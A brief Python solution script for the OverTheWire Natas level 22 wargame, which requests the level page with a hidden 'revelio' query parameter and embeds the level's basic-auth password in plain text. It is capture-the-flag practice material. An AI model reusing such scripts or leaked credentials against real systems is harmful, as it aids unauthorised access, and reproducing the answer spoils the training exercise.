from requests import get, post
from requests.auth import HTTPBasicAuth

url = "http://natas22.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas22", "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ")

r = get(
  url = url + "?revelio=true",
  auth = auth
)
print(r.text)